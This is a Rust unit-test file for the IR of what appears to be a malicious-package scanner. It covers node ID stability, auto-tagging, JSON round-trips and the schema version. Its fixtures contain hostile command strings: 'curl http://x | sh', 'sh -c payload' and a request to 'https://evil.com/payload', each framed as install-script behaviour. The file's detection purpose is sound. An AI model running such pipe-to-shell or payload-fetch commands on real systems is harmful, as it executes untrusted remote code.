use vk_ir::{FileIr, IrNode, IrNodeKind, NodeTag, SourceLocation, SCHEMA_VERSION};

fn loc(file: &str, line: u32, col: u32) -> SourceLocation {
    SourceLocation { file: file.to_string(), line, col }
}

// ── ID stability ──────────────────────────────────────────────────────────────

#[test]
fn stable_id_for_process_exec() {
    let n1 = IrNode::new(
        IrNodeKind::ProcessExec { command: Some("curl http://x | sh".to_string()), arg_source: Default::default() },
        loc("install.js", 10, 2),
    );
    let n2 = IrNode::new(
        IrNodeKind::ProcessExec { command: Some("curl http://x | sh".to_string()), arg_source: Default::default() },
        loc("install.js", 10, 2),
    );
    // Same inputs → same ID
    assert_eq!(n1.id, n2.id);
    // Format starts with file:line:Kind
    assert!(n1.id.starts_with("install.js:10:ProcessExec:"));
}

#[test]
fn different_commands_same_line_get_distinct_ids() {
    let n1 = IrNode::new(
        IrNodeKind::ProcessExec { command: Some("cmd1".to_string()), arg_source: Default::default() },
        loc("install.js", 5, 0),
    );
    let n2 = IrNode::new(
        IrNodeKind::ProcessExec { command: Some("cmd2".to_string()), arg_source: Default::default() },
        loc("install.js", 5, 0),
    );
    assert_ne!(n1.id, n2.id);
}

#[test]
fn stable_id_for_entry_point() {
    let node = IrNode::new(
        IrNodeKind::EntryPoint { script: Some("postinstall".to_string()) },
        loc("index.js", 1, 0),
    );
    assert!(node.id.starts_with("index.js:1:EntryPoint:"));
}

#[test]
fn stable_id_for_obfuscated_flow() {
    let node = IrNode::new(IrNodeKind::ObfuscatedFlow, loc("lib/a.js", 5, 0));
    assert!(node.id.starts_with("lib/a.js:5:ObfuscatedFlow:"));
}

// ── Tags ──────────────────────────────────────────────────────────────────────

#[test]
fn auto_tag_uses_literal_arg_when_command_known() {
    let node = IrNode::new(
        IrNodeKind::ProcessExec { command: Some("ls -la".to_string()), arg_source: Default::default() },
        loc("a.js", 1, 0),
    );
    assert!(node.tags.contains(&NodeTag::UsesLiteralArg));
    assert!(!node.tags.contains(&NodeTag::DynamicArg));
}

#[test]
fn auto_tag_dynamic_arg_when_no_command() {
    let node = IrNode::new(
        IrNodeKind::ProcessExec { command: None, arg_source: Default::default() },
        loc("a.js", 1, 0),
    );
    assert!(node.tags.contains(&NodeTag::DynamicArg));
}

#[test]
fn auto_tag_obfuscated_flow_gets_dynamic_arg() {
    let node = IrNode::new(IrNodeKind::ObfuscatedFlow, loc("a.js", 1, 0));
    assert!(node.tags.contains(&NodeTag::DynamicArg));
}

#[test]
fn with_tags_appends_without_duplicates() {
    let node = IrNode::with_tags(
        IrNodeKind::ProcessExec { command: Some("ls".to_string()), arg_source: Default::default() },
        loc("a.js", 1, 0),
        vec![NodeTag::UsesLiteralArg, NodeTag::ObfuscatedContext],
    );
    // UsesLiteralArg was already auto-tagged, should not be duplicated
    assert_eq!(node.tags.iter().filter(|t| **t == NodeTag::UsesLiteralArg).count(), 1);
    assert!(node.tags.contains(&NodeTag::ObfuscatedContext));
}

// ── Serialisation ─────────────────────────────────────────────────────────────

#[test]
fn ir_node_roundtrips_json() {
    let node = IrNode::new(
        IrNodeKind::NetworkRequest { url: Some("https://evil.com/payload".to_string()), arg_source: Default::default() },
        loc("install.js", 20, 4),
    );
    let json = serde_json::to_string(&node).unwrap();
    let back: IrNode = serde_json::from_str(&json).unwrap();
    assert_eq!(node, back);
}

#[test]
fn file_ir_serializes_correctly() {
    let file_ir = FileIr {
        file: "install.js".to_string(),
        nodes: vec![
            IrNode::new(
                IrNodeKind::ProcessExec { command: Some("sh -c payload".to_string()), arg_source: Default::default() },
                loc("install.js", 5, 2),
            ),
            IrNode::new(IrNodeKind::ObfuscatedFlow, loc("install.js", 7, 0)),
        ],
    };
    let json = serde_json::to_string_pretty(&file_ir).unwrap();
    assert!(json.contains("ProcessExec"));
    assert!(json.contains("ObfuscatedFlow"));
}

#[test]
fn encoded_string_node() {
    let node = IrNode::new(
        IrNodeKind::EncodedString {
            encoding: "base64".to_string(),
            value: "aGVsbG8=".to_string(),
        },
        loc("lib/decode.js", 3, 8),
    );
    assert!(node.id.starts_with("lib/decode.js:3:EncodedString:"));
    assert!(matches!(&node.kind, IrNodeKind::EncodedString { encoding, .. } if encoding == "base64"));
}

// ── Schema version ────────────────────────────────────────────────────────────

#[test]
fn schema_version_is_1_0() {
    assert_eq!(SCHEMA_VERSION, "1.0");
}
